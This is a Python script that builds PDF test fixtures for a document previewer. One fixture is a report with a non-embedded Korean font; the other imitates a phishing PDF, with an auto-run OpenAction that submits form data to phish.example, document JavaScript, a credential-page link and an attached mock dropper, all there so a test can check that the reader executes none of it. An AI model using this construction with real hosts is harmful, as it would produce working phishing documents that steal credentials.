# Copyright 2026- Seongwoo Hong. All rights reserved.
"""
The preview fixtures (commit 42a, docs/PREVIEWS.md), made, not downloaded:
every byte of them is ours, so a test proves what it says and carries no
one else's file. Run from anywhere:

    python3 -I tests/fixtures/preview/make.py tests/fixtures/preview

report.pdf   three pages of text; page two in Korean, in a CID font the
             PDF does NOT embed (HYSMyeongJo-Medium), so pdf.js needs a CMap
             (UniKS-UCS2-H) — fetched for the frame by the app, the one
             asset path the frame has. Title and author in its metadata.
hostile.pdf  what a phishing or malware PDF carries: an OpenAction that
             runs JavaScript, document-level JavaScript, a link to a
             credential page, and an embedded file. The reader must run
             none of it, follow nothing, open nothing — and SAY so.
"""

import sys
from pathlib import Path

from reportlab.lib.pagesizes import A4
from reportlab.pdfbase import pdfmetrics
from reportlab.pdfbase.cidfonts import UnicodeCIDFont
from reportlab.pdfgen import canvas
from pypdf import PdfReader, PdfWriter
from pypdf.annotations import Link
from pypdf.generic import ArrayObject, ByteStringObject, NameObject, DictionaryObject, TextStringObject

out = Path(sys.argv[1])
out.mkdir(parents=True, exist_ok=True)


def fixed(c: canvas.Canvas) -> None:
    # The same bytes on every run: no creation time, no random document id.
    c.setCreator("gorani fixtures")
    c.setProducer("gorani fixtures")


report = out / "report.pdf"
pdfmetrics.registerFont(UnicodeCIDFont("HYSMyeongJo-Medium"))
c = canvas.Canvas(str(report), pagesize=A4, invariant=1)
fixed(c)
c.setTitle("Quarterly report")
c.setAuthor("Gorani tests")
for n, line in [(1, "Gorani PDF page one"), (2, None), (3, "Gorani PDF page three")]:
    c.setFont("Helvetica", 28)
    c.drawString(72, 760, f"Page {n}")
    if line:
        c.drawString(72, 700, line)
    else:
        c.setFont("HYSMyeongJo-Medium", 24)
        c.drawString(72, 700, "고라니 보고서 둘째 쪽")
    c.showPage()
c.save()

plain = out / "_plain.pdf"
c = canvas.Canvas(str(plain), pagesize=A4, invariant=1)
fixed(c)
c.setFont("Helvetica", 28)
c.drawString(72, 760, "Invoice overdue")
c.drawString(72, 700, "Sign in to view the invoice")
c.showPage()
c.save()

w = PdfWriter(clone_from=str(plain))
w.add_metadata({"/Title": "Invoice", "/Producer": "gorani fixtures"})
# Document-level JavaScript (a /Names /JavaScript tree, built by hand:
# pypdf's add_js names it with a random UUID), and an OpenAction that runs
# more on open.
js = w._add_object(DictionaryObject({
    NameObject("/S"): NameObject("/JavaScript"),
    NameObject("/JS"): TextStringObject("app.alert('gorani: document JavaScript ran');"),
}))
w._root_object[NameObject("/Names")] = DictionaryObject({
    NameObject("/JavaScript"): DictionaryObject({NameObject("/Names"): ArrayObject([TextStringObject("gorani-fixture"), js])}),
})
w._root_object[NameObject("/OpenAction")] = DictionaryObject({
    NameObject("/S"): NameObject("/JavaScript"),
    NameObject("/JS"): TextStringObject("app.alert('gorani: OpenAction ran'); this.submitForm('https://phish.example/collect');"),
})
w.add_annotation(page_number=0, annotation=Link(rect=(72, 690, 400, 720), url="https://phish.example/login"))
w.add_attachment("payload.txt", b"pretend this is a dropper\n")
# A fixed document id (pypdf draws a random one): the same bytes every run.
w._ID = ArrayObject([ByteStringObject(b"gorani-fixture-1"), ByteStringObject(b"gorani-fixture-1")])
with open(out / "hostile.pdf", "wb") as f:
    w.write(f)
plain.unlink()

for p in (report, out / "hostile.pdf"):
    r = PdfReader(str(p))
    print(f"{p.name}: {len(r.pages)} page(s), {p.stat().st_size} bytes")
